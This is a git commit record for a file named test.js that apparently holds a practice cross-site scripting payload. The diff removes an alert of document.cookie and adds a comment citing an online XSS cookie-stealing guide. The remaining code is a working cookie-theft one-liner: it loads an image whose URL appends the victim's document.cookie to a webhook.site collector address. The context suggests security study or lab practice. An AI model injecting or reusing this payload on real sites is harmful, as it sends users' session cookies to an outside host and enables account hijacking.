681f97e0b53805b06e077f3b18ce3343754dd49d
darrenangwx <darrenawx@gmail.com>
2024-02-18 04:33:51 +0800

    add reference

--- test.js
+++ test.js
@@ -1,5 +1,6 @@
-alert(document.cookie);
 var i = new Image();
 i.src =
   "https://webhook.site/d8c9a517-27b7-4283-a8eb-aece67a41659/?" +
   document.cookie;
+
+//Reference: https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md#2-silent-one-liner
